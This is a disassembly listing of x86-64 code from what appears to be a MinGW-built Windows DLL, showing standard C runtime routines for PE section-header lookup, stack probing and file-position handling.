    69dc45f9:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    69dc45fd:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
    69dc4602:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
    69dc4606:	85 c9                	test   %ecx,%ecx
    69dc4608:	74 2e                	je     0x69dc4638
    69dc460a:	83 e9 01             	sub    $0x1,%ecx
    69dc460d:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
    69dc4611:	48 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%rcx
    69dc4616:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc461d:	00 00 00 
    69dc4620:	f6 40 27 20          	testb  $0x20,0x27(%rax)
    69dc4624:	74 09                	je     0x69dc462f
    69dc4626:	48 85 d2             	test   %rdx,%rdx
    69dc4629:	74 0f                	je     0x69dc463a
    69dc462b:	48 83 ea 01          	sub    $0x1,%rdx
    69dc462f:	48 83 c0 28          	add    $0x28,%rax
    69dc4633:	48 39 c8             	cmp    %rcx,%rax
    69dc4636:	75 e8                	jne    0x69dc4620
    69dc4638:	31 c0                	xor    %eax,%eax
    69dc463a:	48 83 c4 28          	add    $0x28,%rsp
    69dc463e:	c3                   	ret
    69dc463f:	90                   	nop
    69dc4640:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4644:	48 8b 15 a5 2d 00 00 	mov    0x2da5(%rip),%rdx        # 0x69dc73f0
    69dc464b:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    69dc4650:	75 1e                	jne    0x69dc4670
    69dc4652:	48 89 d1             	mov    %rdx,%rcx
    69dc4655:	e8 96 fd ff ff       	call   0x69dc43f0
    69dc465a:	85 c0                	test   %eax,%eax
    69dc465c:	b8 00 00 00 00       	mov    $0x0,%eax
    69dc4661:	48 0f 45 c2          	cmovne %rdx,%rax
    69dc4665:	48 83 c4 28          	add    $0x28,%rsp
    69dc4669:	c3                   	ret
    69dc466a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc4670:	31 c0                	xor    %eax,%eax
    69dc4672:	48 83 c4 28          	add    $0x28,%rsp
    69dc4676:	c3                   	ret
    69dc4677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc467e:	00 00 
    69dc4680:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4684:	4c 8b 05 65 2d 00 00 	mov    0x2d65(%rip),%r8        # 0x69dc73f0
    69dc468b:	31 c0                	xor    %eax,%eax
    69dc468d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    69dc4693:	48 89 ca             	mov    %rcx,%rdx
    69dc4696:	74 08                	je     0x69dc46a0
    69dc4698:	48 83 c4 28          	add    $0x28,%rsp
    69dc469c:	c3                   	ret
    69dc469d:	0f 1f 00             	nopl   (%rax)
    69dc46a0:	4c 89 c1             	mov    %r8,%rcx
    69dc46a3:	e8 48 fd ff ff       	call   0x69dc43f0
    69dc46a8:	85 c0                	test   %eax,%eax
    69dc46aa:	74 ec                	je     0x69dc4698
    69dc46ac:	49 63 40 3c          	movslq 0x3c(%r8),%rax
    69dc46b0:	48 89 d1             	mov    %rdx,%rcx
    69dc46b3:	4c 29 c1             	sub    %r8,%rcx
    69dc46b6:	49 01 c0             	add    %rax,%r8
    69dc46b9:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
    69dc46be:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
    69dc46c3:	85 d2                	test   %edx,%edx
    69dc46c5:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
    69dc46ca:	74 31                	je     0x69dc46fd
    69dc46cc:	83 ea 01             	sub    $0x1,%edx
    69dc46cf:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    69dc46d3:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
    69dc46d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc46df:	00 
    69dc46e0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    69dc46e4:	4c 39 c1             	cmp    %r8,%rcx
    69dc46e7:	4c 89 c2             	mov    %r8,%rdx
    69dc46ea:	72 08                	jb     0x69dc46f4
    69dc46ec:	03 50 08             	add    0x8(%rax),%edx
    69dc46ef:	48 39 d1             	cmp    %rdx,%rcx
    69dc46f2:	72 10                	jb     0x69dc4704
    69dc46f4:	48 83 c0 28          	add    $0x28,%rax
    69dc46f8:	4c 39 c8             	cmp    %r9,%rax
    69dc46fb:	75 e3                	jne    0x69dc46e0
    69dc46fd:	31 c0                	xor    %eax,%eax
    69dc46ff:	48 83 c4 28          	add    $0x28,%rsp
    69dc4703:	c3                   	ret
    69dc4704:	8b 40 24             	mov    0x24(%rax),%eax
    69dc4707:	f7 d0                	not    %eax
    69dc4709:	c1 e8 1f             	shr    $0x1f,%eax
    69dc470c:	48 83 c4 28          	add    $0x28,%rsp
    69dc4710:	c3                   	ret
    69dc4711:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc4716:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc471d:	00 00 00 
    69dc4720:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4724:	4c 8b 1d c5 2c 00 00 	mov    0x2cc5(%rip),%r11        # 0x69dc73f0
    69dc472b:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
    69dc4731:	41 89 c9             	mov    %ecx,%r9d
    69dc4734:	75 58                	jne    0x69dc478e
    69dc4736:	4c 89 d9             	mov    %r11,%rcx
    69dc4739:	e8 b2 fc ff ff       	call   0x69dc43f0
    69dc473e:	85 c0                	test   %eax,%eax
    69dc4740:	74 4c                	je     0x69dc478e
    69dc4742:	49 63 43 3c          	movslq 0x3c(%r11),%rax
    69dc4746:	4c 01 d8             	add    %r11,%rax
    69dc4749:	8b 90 90 00 00 00    	mov    0x90(%rax),%edx
    69dc474f:	85 d2                	test   %edx,%edx
    69dc4751:	74 3b                	je     0x69dc478e
    69dc4753:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
    69dc4757:	48 8d 4c 08 18       	lea    0x18(%rax,%rcx,1),%rcx
    69dc475c:	0f b7 40 06          	movzwl 0x6(%rax),%eax
    69dc4760:	85 c0                	test   %eax,%eax
    69dc4762:	74 2a                	je     0x69dc478e
    69dc4764:	83 e8 01             	sub    $0x1,%eax
    69dc4767:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    69dc476b:	48 8d 44 c1 28       	lea    0x28(%rcx,%rax,8),%rax
    69dc4770:	44 8b 51 0c          	mov    0xc(%rcx),%r10d
    69dc4774:	4c 39 d2             	cmp    %r10,%rdx
    69dc4777:	4d 89 d0             	mov    %r10,%r8
    69dc477a:	72 09                	jb     0x69dc4785
    69dc477c:	44 03 41 08          	add    0x8(%rcx),%r8d
    69dc4780:	4c 39 c2             	cmp    %r8,%rdx
    69dc4783:	72 10                	jb     0x69dc4795
    69dc4785:	48 83 c1 28          	add    $0x28,%rcx
    69dc4789:	48 39 c1             	cmp    %rax,%rcx
    69dc478c:	75 e2                	jne    0x69dc4770
    69dc478e:	31 c0                	xor    %eax,%eax
    69dc4790:	48 83 c4 28          	add    $0x28,%rsp
    69dc4794:	c3                   	ret
    69dc4795:	4c 01 da             	add    %r11,%rdx
    69dc4798:	75 0e                	jne    0x69dc47a8
    69dc479a:	eb f2                	jmp    0x69dc478e
    69dc479c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc47a0:	41 83 e9 01          	sub    $0x1,%r9d
    69dc47a4:	48 83 c2 14          	add    $0x14,%rdx
    69dc47a8:	8b 4a 04             	mov    0x4(%rdx),%ecx
    69dc47ab:	85 c9                	test   %ecx,%ecx
    69dc47ad:	75 07                	jne    0x69dc47b6
    69dc47af:	8b 42 0c             	mov    0xc(%rdx),%eax
    69dc47b2:	85 c0                	test   %eax,%eax
    69dc47b4:	74 d8                	je     0x69dc478e
    69dc47b6:	45 85 c9             	test   %r9d,%r9d
    69dc47b9:	7f e5                	jg     0x69dc47a0
    69dc47bb:	8b 42 0c             	mov    0xc(%rdx),%eax
    69dc47be:	4c 01 d8             	add    %r11,%rax
    69dc47c1:	48 83 c4 28          	add    $0x28,%rsp
    69dc47c5:	c3                   	ret
    69dc47c6:	90                   	nop
    69dc47c7:	90                   	nop
    69dc47c8:	90                   	nop
    69dc47c9:	90                   	nop
    69dc47ca:	90                   	nop
    69dc47cb:	90                   	nop
    69dc47cc:	90                   	nop
    69dc47cd:	90                   	nop
    69dc47ce:	90                   	nop
    69dc47cf:	90                   	nop
    69dc47d0:	db e3                	fninit
    69dc47d2:	c3                   	ret
    69dc47d3:	90                   	nop
    69dc47d4:	90                   	nop
    69dc47d5:	90                   	nop
    69dc47d6:	90                   	nop
    69dc47d7:	90                   	nop
    69dc47d8:	90                   	nop
    69dc47d9:	90                   	nop
    69dc47da:	90                   	nop
    69dc47db:	90                   	nop
    69dc47dc:	90                   	nop
    69dc47dd:	90                   	nop
    69dc47de:	90                   	nop
    69dc47df:	90                   	nop
    69dc47e0:	51                   	push   %rcx
    69dc47e1:	50                   	push   %rax
    69dc47e2:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    69dc47e8:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
    69dc47ed:	72 19                	jb     0x69dc4808
    69dc47ef:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
    69dc47f6:	48 83 09 00          	orq    $0x0,(%rcx)
    69dc47fa:	48 2d 00 10 00 00    	sub    $0x1000,%rax
    69dc4800:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    69dc4806:	77 e7                	ja     0x69dc47ef
    69dc4808:	48 29 c1             	sub    %rax,%rcx
    69dc480b:	48 83 09 00          	orq    $0x0,(%rcx)
    69dc480f:	58                   	pop    %rax
    69dc4810:	59                   	pop    %rcx
    69dc4811:	c3                   	ret
    69dc4812:	90                   	nop
    69dc4813:	90                   	nop
    69dc4814:	90                   	nop
    69dc4815:	90                   	nop
    69dc4816:	90                   	nop
    69dc4817:	90                   	nop
    69dc4818:	90                   	nop
    69dc4819:	90                   	nop
    69dc481a:	90                   	nop
    69dc481b:	90                   	nop
    69dc481c:	90                   	nop
    69dc481d:	90                   	nop
    69dc481e:	90                   	nop
    69dc481f:	90                   	nop
    69dc4820:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc4825:	c3                   	ret
    69dc4826:	90                   	nop
    69dc4827:	90                   	nop
    69dc4828:	90                   	nop
    69dc4829:	90                   	nop
    69dc482a:	90                   	nop
    69dc482b:	90                   	nop
    69dc482c:	90                   	nop
    69dc482d:	90                   	nop
    69dc482e:	90                   	nop
    69dc482f:	90                   	nop
    69dc4830:	57                   	push   %rdi
    69dc4831:	56                   	push   %rsi
    69dc4832:	53                   	push   %rbx
    69dc4833:	48 83 ec 20          	sub    $0x20,%rsp
    69dc4837:	31 c0                	xor    %eax,%eax
    69dc4839:	48 89 cb             	mov    %rcx,%rbx
    69dc483c:	8b 49 18             	mov    0x18(%rcx),%ecx
    69dc483f:	48 8b 73 10          	mov    0x10(%rbx),%rsi
    69dc4843:	89 ca                	mov    %ecx,%edx
    69dc4845:	83 e2 03             	and    $0x3,%edx
    69dc4848:	83 fa 02             	cmp    $0x2,%edx
    69dc484b:	74 13                	je     0x69dc4860
    69dc484d:	48 89 33             	mov    %rsi,(%rbx)
    69dc4850:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%rbx)
    69dc4857:	48 83 c4 20          	add    $0x20,%rsp
    69dc485b:	5b                   	pop    %rbx
    69dc485c:	5e                   	pop    %rsi
    69dc485d:	5f                   	pop    %rdi
    69dc485e:	c3                   	ret
    69dc485f:	90                   	nop
    69dc4860:	89 c8                	mov    %ecx,%eax
    69dc4862:	25 08 01 00 00       	and    $0x108,%eax
    69dc4867:	74 e4                	je     0x69dc484d
    69dc4869:	48 8b 3b             	mov    (%rbx),%rdi
    69dc486c:	31 c0                	xor    %eax,%eax
    69dc486e:	48 29 f7             	sub    %rsi,%rdi
    69dc4871:	48 85 ff             	test   %rdi,%rdi
    69dc4874:	7e d7                	jle    0x69dc484d
    69dc4876:	48 89 d9             	mov    %rbx,%rcx
    69dc4879:	e8 72 05 00 00       	call   0x69dc4df0
    69dc487e:	41 89 f8             	mov    %edi,%r8d
    69dc4881:	48 89 f2             	mov    %rsi,%rdx
    69dc4884:	89 c1                	mov    %eax,%ecx
    69dc4886:	e8 45 05 00 00       	call   0x69dc4dd0
    69dc488b:	48 98                	cltq
    69dc488d:	48 39 f8             	cmp    %rdi,%rax
    69dc4890:	75 1a                	jne    0x69dc48ac
    69dc4892:	8b 53 18             	mov    0x18(%rbx),%edx
    69dc4895:	48 8b 73 10          	mov    0x10(%rbx),%rsi
    69dc4899:	89 d0                	mov    %edx,%eax
    69dc489b:	25 80 00 00 00       	and    $0x80,%eax
    69dc48a0:	74 ab                	je     0x69dc484d
    69dc48a2:	83 e2 fd             	and    $0xfffffffd,%edx
    69dc48a5:	31 c0                	xor    %eax,%eax
    69dc48a7:	89 53 18             	mov    %edx,0x18(%rbx)
    69dc48aa:	eb a1                	jmp    0x69dc484d
    69dc48ac:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
    69dc48b0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc48b5:	48 8b 73 10          	mov    0x10(%rbx),%rsi
    69dc48b9:	eb 92                	jmp    0x69dc484d
    69dc48bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc48c0:	57                   	push   %rdi
    69dc48c1:	56                   	push   %rsi
    69dc48c2:	53                   	push   %rbx
    69dc48c3:	48 83 ec 30          	sub    $0x30,%rsp
    69dc48c7:	41 83 f8 01          	cmp    $0x1,%r8d
    69dc48cb:	48 89 cb             	mov    %rcx,%rbx
    69dc48ce:	48 89 d7             	mov    %rdx,%rdi
    69dc48d1:	74 2d                	je     0x69dc4900
    69dc48d3:	41 83 f8 02          	cmp    $0x2,%r8d
    69dc48d7:	74 47                	je     0x69dc4920
    69dc48d9:	45 85 c0             	test   %r8d,%r8d
    69dc48dc:	75 6c                	jne    0x69dc494a
    69dc48de:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    69dc48e3:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
    69dc48e8:	48 89 f2             	mov    %rsi,%rdx
    69dc48eb:	48 89 d9             	mov    %rbx,%rcx
    69dc48ee:	e8 8d 04 00 00       	call   0x69dc4d80
    69dc48f3:	48 83 c4 30          	add    $0x30,%rsp
    69dc48f7:	5b                   	pop    %rbx
    69dc48f8:	5e                   	pop    %rsi
    69dc48f9:	5f                   	pop    %rdi
    69dc48fa:	c3                   	ret
    69dc48fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc4900:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
    69dc4905:	48 89 f2             	mov    %rsi,%rdx
    69dc4908:	e8 93 04 00 00       	call   0x69dc4da0
    69dc490d:	85 c0                	test   %eax,%eax
    69dc490f:	75 32                	jne    0x69dc4943
    69dc4911:	48 01 7c 24 28       	add    %rdi,0x28(%rsp)
    69dc4916:	eb d0                	jmp    0x69dc48e8
    69dc4918:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc491f:	00 
    69dc4920:	e8 83 04 00 00       	call   0x69dc4da8
    69dc4925:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
    69dc492a:	48 89 d9             	mov    %rbx,%rcx
    69dc492d:	e8 be 04 00 00       	call   0x69dc4df0
    69dc4932:	89 c1                	mov    %eax,%ecx
    69dc4934:	e8 bf 04 00 00       	call   0x69dc4df8
    69dc4939:	48 01 c7             	add    %rax,%rdi
    69dc493c:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
    69dc4941:	eb a5                	jmp    0x69dc48e8
    69dc4943:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc4948:	eb a9                	jmp    0x69dc48f3
    69dc494a:	e8 b1 04 00 00       	call   0x69dc4e00
    69dc494f:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
    69dc4955:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc495a:	eb 97                	jmp    0x69dc48f3
    69dc495c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc4960:	41 57                	push   %r15
    69dc4962:	41 56                	push   %r14
    69dc4964:	41 55                	push   %r13
    69dc4966:	41 54                	push   %r12
    69dc4968:	55                   	push   %rbp
    69dc4969:	57                   	push   %rdi
    69dc496a:	56                   	push   %rsi
    69dc496b:	53                   	push   %rbx
    69dc496c:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4970:	48 89 cb             	mov    %rcx,%rbx
    69dc4973:	e8 88 04 00 00       	call   0x69dc4e00
    69dc4978:	48 89 d9             	mov    %rbx,%rcx
    69dc497b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    69dc4981:	e8 6a 04 00 00       	call   0x69dc4df0
    69dc4986:	89 c7                	mov    %eax,%edi
    69dc4988:	8b 43 08             	mov    0x8(%rbx),%eax
    69dc498b:	85 c0                	test   %eax,%eax
    69dc498d:	79 07                	jns    0x69dc4996
    69dc498f:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%rbx)
    69dc4996:	31 d2                	xor    %edx,%edx
    69dc4998:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    69dc499e:	89 f9                	mov    %edi,%ecx
    69dc49a0:	e8 3b 04 00 00       	call   0x69dc4de0
    69dc49a5:	48 85 c0             	test   %rax,%rax
    69dc49a8:	48 89 c6             	mov    %rax,%rsi
    69dc49ab:	0f 88 bf 01 00 00    	js     0x69dc4b70
    69dc49b1:	8b 53 18             	mov    0x18(%rbx),%edx
    69dc49b4:	f7 c2 08 01 00 00    	test   $0x108,%edx
    69dc49ba:	0f 84 e0 00 00 00    	je     0x69dc4aa0
    69dc49c0:	48 8b 0b             	mov    (%rbx),%rcx
    69dc49c3:	48 8b 43 10          	mov    0x10(%rbx),%rax
    69dc49c7:	49 89 c9             	mov    %rcx,%r9
    69dc49ca:	49 29 c1             	sub    %rax,%r9
    69dc49cd:	f6 c2 03             	test   $0x3,%dl
    69dc49d0:	75 6e                	jne    0x69dc4a40
    69dc49d2:	f6 c2 80             	test   $0x80,%dl
    69dc49d5:	0f 84 b2 01 00 00    	je     0x69dc4b8d
    69dc49db:	4c 89 cd             	mov    %r9,%rbp
    69dc49de:	48 85 f6             	test   %rsi,%rsi
    69dc49e1:	0f 84 d9 00 00 00    	je     0x69dc4ac0
    69dc49e7:	83 e2 01             	and    $0x1,%edx
    69dc49ea:	0f 84 20 01 00 00    	je     0x69dc4b10
    69dc49f0:	48 63 43 08          	movslq 0x8(%rbx),%rax
    69dc49f4:	85 c0                	test   %eax,%eax
    69dc49f6:	0f 84 ab 00 00 00    	je     0x69dc4aa7
    69dc49fc:	4c 8b 3d fd 29 00 00 	mov    0x29fd(%rip),%r15        # 0x69dc7400
    69dc4a03:	4e 8d 24 08          	lea    (%rax,%r9,1),%r12
    69dc4a07:	41 89 fe             	mov    %edi,%r14d
    69dc4a0a:	41 89 fd             	mov    %edi,%r13d
    69dc4a0d:	41 c1 fe 05          	sar    $0x5,%r14d
    69dc4a11:	41 83 e5 1f          	and    $0x1f,%r13d
    69dc4a15:	4d 63 f6             	movslq %r14d,%r14
    69dc4a18:	49 c1 e5 06          	shl    $0x6,%r13
    69dc4a1c:	49 8b 07             	mov    (%r15),%rax
    69dc4a1f:	4a 8b 04 f0          	mov    (%rax,%r14,8),%rax
    69dc4a23:	42 80 7c 28 08 00    	cmpb   $0x0,0x8(%rax,%r13,1)
    69dc4a29:	0f 88 e6 00 00 00    	js     0x69dc4b15
    69dc4a2f:	4c 29 e6             	sub    %r12,%rsi
    69dc4a32:	48 01 ee             	add    %rbp,%rsi
    69dc4a35:	eb 70                	jmp    0x69dc4aa7
    69dc4a37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc4a3e:	00 00 
    69dc4a40:	4c 8b 05 b9 29 00 00 	mov    0x29b9(%rip),%r8        # 0x69dc7400
    69dc4a47:	41 89 fa             	mov    %edi,%r10d
    69dc4a4a:	4c 89 cd             	mov    %r9,%rbp
    69dc4a4d:	41 c1 fa 05          	sar    $0x5,%r10d
    69dc4a51:	4d 63 d2             	movslq %r10d,%r10
    69dc4a54:	4d 8b 18             	mov    (%r8),%r11
    69dc4a57:	41 89 f8             	mov    %edi,%r8d
    69dc4a5a:	41 83 e0 1f          	and    $0x1f,%r8d
    69dc4a5e:	49 c1 e0 06          	shl    $0x6,%r8
    69dc4a62:	4f 03 04 d3          	add    (%r11,%r10,8),%r8
    69dc4a66:	41 80 78 08 00       	cmpb   $0x0,0x8(%r8)
    69dc4a6b:	0f 89 6d ff ff ff    	jns    0x69dc49de
    69dc4a71:	48 39 c1             	cmp    %rax,%rcx
    69dc4a74:	0f 86 61 ff ff ff    	jbe    0x69dc49db
    69dc4a7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc4a80:	45 31 c0             	xor    %r8d,%r8d
    69dc4a83:	80 38 0a             	cmpb   $0xa,(%rax)
    69dc4a86:	41 0f 94 c0          	sete   %r8b
    69dc4a8a:	48 83 c0 01          	add    $0x1,%rax
    69dc4a8e:	4c 01 c5             	add    %r8,%rbp
    69dc4a91:	48 39 c1             	cmp    %rax,%rcx
    69dc4a94:	75 ea                	jne    0x69dc4a80
    69dc4a96:	e9 43 ff ff ff       	jmp    0x69dc49de
    69dc4a9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc4aa0:	48 63 43 08          	movslq 0x8(%rbx),%rax
    69dc4aa4:	48 29 c6             	sub    %rax,%rsi
    69dc4aa7:	48 89 f0             	mov    %rsi,%rax
    69dc4aaa:	48 83 c4 28          	add    $0x28,%rsp
    69dc4aae:	5b                   	pop    %rbx
    69dc4aaf:	5e                   	pop    %rsi
    69dc4ab0:	5f                   	pop    %rdi
    69dc4ab1:	5d                   	pop    %rbp
    69dc4ab2:	41 5c                	pop    %r12
    69dc4ab4:	41 5d                	pop    %r13
    69dc4ab6:	41 5e                	pop    %r14
    69dc4ab8:	41 5f                	pop    %r15
    69dc4aba:	c3                   	ret
    69dc4abb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc4ac0:	48 89 ee             	mov    %rbp,%rsi
    69dc4ac3:	eb e2                	jmp    0x69dc4aa7
    69dc4ac5:	45 31 c0             	xor    %r8d,%r8d
    69dc4ac8:	48 89 f2             	mov    %rsi,%rdx
    69dc4acb:	89 f9                	mov    %edi,%ecx
    69dc4acd:	e8 0e 03 00 00       	call   0x69dc4de0
    69dc4ad2:	49 81 fc 00 02 00 00 	cmp    $0x200,%r12
    69dc4ad9:	77 13                	ja     0x69dc4aee
    69dc4adb:	8b 53 18             	mov    0x18(%rbx),%edx
    69dc4ade:	b8 00 02 00 00       	mov    $0x200,%eax
    69dc4ae3:	81 e2 08 04 00 00    	and    $0x408,%edx
    69dc4ae9:	83 fa 08             	cmp    $0x8,%edx
    69dc4aec:	74 04                	je     0x69dc4af2
    69dc4aee:	48 63 43 24          	movslq 0x24(%rbx),%rax
    69dc4af2:	49 8b 17             	mov    (%r15),%rdx
    69dc4af5:	4a 8b 14 f2          	mov    (%rdx,%r14,8),%rdx
    69dc4af9:	42 f6 44 2a 08 04    	testb  $0x4,0x8(%rdx,%r13,1)
    69dc4aff:	74 04                	je     0x69dc4b05
    69dc4b01:	48 83 c0 01          	add    $0x1,%rax
    69dc4b05:	48 29 c6             	sub    %rax,%rsi
    69dc4b08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc4b0f:	00 
    69dc4b10:	48 01 ee             	add    %rbp,%rsi
    69dc4b13:	eb 92                	jmp    0x69dc4aa7
    69dc4b15:	31 d2                	xor    %edx,%edx
    69dc4b17:	41 b8 02 00 00 00    	mov    $0x2,%r8d
    69dc4b1d:	89 f9                	mov    %edi,%ecx
    69dc4b1f:	e8 bc 02 00 00       	call   0x69dc4de0
    69dc4b24:	48 39 f0             	cmp    %rsi,%rax
    69dc4b27:	75 9c                	jne    0x69dc4ac5
    69dc4b29:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    69dc4b2d:	4e 8d 04 22          	lea    (%rdx,%r12,1),%r8
    69dc4b31:	4c 39 c2             	cmp    %r8,%rdx
    69dc4b34:	73 1e                	jae    0x69dc4b54
    69dc4b36:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc4b3d:	00 00 00 
    69dc4b40:	31 c9                	xor    %ecx,%ecx
    69dc4b42:	80 3a 0a             	cmpb   $0xa,(%rdx)
    69dc4b45:	0f 94 c1             	sete   %cl
    69dc4b48:	48 83 c2 01          	add    $0x1,%rdx
    69dc4b4c:	49 01 cc             	add    %rcx,%r12
    69dc4b4f:	49 39 d0             	cmp    %rdx,%r8
    69dc4b52:	75 ec                	jne    0x69dc4b40
    69dc4b54:	f6 43 19 20          	testb  $0x20,0x19(%rbx)
    69dc4b58:	75 22                	jne    0x69dc4b7c
    69dc4b5a:	4c 29 e0             	sub    %r12,%rax
    69dc4b5d:	48 8d 34 28          	lea    (%rax,%rbp,1),%rsi
    69dc4b61:	e9 41 ff ff ff       	jmp    0x69dc4aa7
    69dc4b66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc4b6d:	00 00 00 
    69dc4b70:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
    69dc4b77:	e9 2b ff ff ff       	jmp    0x69dc4aa7
    69dc4b7c:	4d 8d 4c 24 01       	lea    0x1(%r12),%r9
    69dc4b81:	4c 29 c8             	sub    %r9,%rax
    69dc4b84:	48 8d 34 28          	lea    (%rax,%rbp,1),%rsi
    69dc4b88:	e9 1a ff ff ff       	jmp    0x69dc4aa7
    69dc4b8d:	e8 6e 02 00 00       	call   0x69dc4e00
    69dc4b92:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
    69dc4b99:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
    69dc4b9f:	e9 03 ff ff ff       	jmp    0x69dc4aa7
    69dc4ba4:	66 90                	xchg   %ax,%ax
    69dc4ba6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc4bad:	00 00 00 
    69dc4bb0:	57                   	push   %rdi
    69dc4bb1:	56                   	push   %rsi
    69dc4bb2:	53                   	push   %rbx
    69dc4bb3:	48 83 ec 20          	sub    $0x20,%rsp
    69dc4bb7:	48 89 cb             	mov    %rcx,%rbx
    69dc4bba:	48 89 d7             	mov    %rdx,%rdi
    69dc4bbd:	44 89 c6             	mov    %r8d,%esi
    69dc4bc0:	e8 3b 02 00 00       	call   0x69dc4e00
    69dc4bc5:	48 85 db             	test   %rbx,%rbx
    69dc4bc8:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    69dc4bce:	74 72                	je     0x69dc4c42
    69dc4bd0:	83 fe 02             	cmp    $0x2,%esi
    69dc4bd3:	77 6d                	ja     0x69dc4c42
    69dc4bd5:	83 63 18 ef          	andl   $0xffffffef,0x18(%rbx)
    69dc4bd9:	83 fe 01             	cmp    $0x1,%esi
    69dc4bdc:	74 55                	je     0x69dc4c33
    69dc4bde:	48 89 d9             	mov    %rbx,%rcx
    69dc4be1:	e8 4a fc ff ff       	call   0x69dc4830
    69dc4be6:	8b 43 18             	mov    0x18(%rbx),%eax
    69dc4be9:	a8 80                	test   $0x80,%al
    69dc4beb:	74 33                	je     0x69dc4c20
    69dc4bed:	83 e0 fc             	and    $0xfffffffc,%eax
    69dc4bf0:	89 43 18             	mov    %eax,0x18(%rbx)
    69dc4bf3:	48 89 d9             	mov    %rbx,%rcx
    69dc4bf6:	e8 f5 01 00 00       	call   0x69dc4df0
    69dc4bfb:	41 89 f0             	mov    %esi,%r8d
    69dc4bfe:	48 89 fa             	mov    %rdi,%rdx
    69dc4c01:	89 c1                	mov    %eax,%ecx
    69dc4c03:	e8 d8 01 00 00       	call   0x69dc4de0
    69dc4c08:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    69dc4c0c:	0f 94 c0             	sete   %al
    69dc4c0f:	0f b6 c0             	movzbl %al,%eax
    69dc4c12:	f7 d8                	neg    %eax
    69dc4c14:	48 83 c4 20          	add    $0x20,%rsp
    69dc4c18:	5b                   	pop    %rbx
    69dc4c19:	5e                   	pop    %rsi
    69dc4c1a:	5f                   	pop    %rdi
    69dc4c1b:	c3                   	ret
    69dc4c1c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc4c20:	25 09 04 00 00       	and    $0x409,%eax
    69dc4c25:	83 f8 09             	cmp    $0x9,%eax
    69dc4c28:	75 c9                	jne    0x69dc4bf3
    69dc4c2a:	c7 43 24 00 02 00 00 	movl   $0x200,0x24(%rbx)
    69dc4c31:	eb c0                	jmp    0x69dc4bf3
    69dc4c33:	48 89 d9             	mov    %rbx,%rcx
    69dc4c36:	31 f6                	xor    %esi,%esi
    69dc4c38:	e8 23 fd ff ff       	call   0x69dc4960
    69dc4c3d:	48 01 c7             	add    %rax,%rdi
    69dc4c40:	eb 9c                	jmp    0x69dc4bde
    69dc4c42:	e8 b9 01 00 00       	call   0x69dc4e00
    69dc4c47:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
    69dc4c4d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc4c52:	eb c0                	jmp    0x69dc4c14
    69dc4c54:	66 90                	xchg   %ax,%ax
